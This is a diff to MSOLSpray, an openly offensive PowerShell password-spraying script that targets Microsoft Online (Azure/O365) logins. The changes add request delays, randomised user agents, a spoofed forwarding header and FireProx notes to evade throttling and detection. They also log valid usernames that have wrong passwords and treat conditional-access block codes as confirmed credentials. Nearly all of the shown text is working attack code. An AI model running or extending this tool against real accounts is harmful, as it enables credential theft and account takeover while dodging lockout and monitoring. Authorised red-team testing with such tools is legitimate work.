@@ -6,6 +6,7 @@ function Invoke-MSOLSpray{
         This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
         MSOLSpray Function: Invoke-MSOLSpray
         Author: Beau Bullock (@dafthack)
+        Mod'r:Ceramicskate0
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
@@ -22,6 +23,10 @@ function Invoke-MSOLSpray{
         
         A single password that will be used to perform the password spray.
     
+    .PARAMETER Delay
+    A number in seconds to delay between requests.
+		
+		
     .PARAMETER OutFile
         
         A file to output valid results to.
@@ -62,17 +67,40 @@ function Invoke-MSOLSpray{
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
     $Password = "",
-
+	
+    [Parameter(Position = 2, Mandatory = $False)]
+    [Int]
+    $Delay = 5,
+	
+	[Parameter(Position = 2, Mandatory = $False)]
+    [Int]
+    $UserAgent  = $(Get-InvokeMSOLUserAgent),
+	
     # Change the URL if you are using something like FireProx
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
-    $URL = "https://login.microsoft.com",
+    $URL = "https://login.microsoft.com ",
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
     $Force
   )
-    
+  
+    Function Get-InvokeMSOLUserAgent {
+    <#
+        .LINK
+        https://github.com/justin-p/PowerShell/blob/master/Get-UserAgent.ps1
+    #>
+    Param (
+        [ValidateSet('Firefox', 'Chrome', 'InternetExplorer', 'Opera', 'Safari')]
+        [string]$BrowserType
+    )
+    if (!$BrowserType) {
+        $BrowserType = Get-Random -InputObject @('Firefox', 'Chrome', 'InternetExplorer', 'Opera', 'Safari')
+    }
+    Return [string]$([Microsoft.PowerShell.Commands.PSUserAgent]::$BrowserType)
+}
+
     $ErrorActionPreference= 'silentlycontinue'
     $Usernames = Get-Content $UserList
     $count = $Usernames.count
@@ -95,8 +123,12 @@ function Invoke-MSOLSpray{
 
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
-        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        #Add Special Headers for Firprox Here. ';' is seperation char. Example: 'X-My-X-HEADER' = 'VALUE'
+        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded';'X-My-X-Forwarded-For' = '127.0.0.1'}
+        if ($Delay) {
+            Start-Sleep -Seconds $Delay
+        }
+		$webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
 
         # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
@@ -112,7 +144,9 @@ function Invoke-MSOLSpray{
                 # Standard invalid password
             If($RespErr -match "AADSTS50126")
                 {
-                continue
+				Write-Output "[*] WARNING! Valid user, but invalid password $username : $password."
+                $fullresults += "Valid user, but invalid password : $username"
+				#continue
                 }
 
                 # Invalid Tenant Response
@@ -124,7 +158,7 @@ function Invoke-MSOLSpray{
                 # Invalid Username
             ElseIf($RespErr -match "AADSTS50034")
                 {
-                Write-Output "[*] WARNING! The user $username doesn't exist."
+                #Write-Output "[*] WARNING! The user $username doesn't exist."
                 }
 
                 # Microsoft MFA response
@@ -160,7 +194,11 @@ function Invoke-MSOLSpray{
                 Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."
                 $fullresults += "$username : $password"
                 }
-
+			ElseIf(($RespErr -match "AADSTS53003")-or ($RespErr -match "AADSTS53000"))
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
+                $fullresults += "$username : $password"
+                }
                 # Unknown errors
             Else
                 {
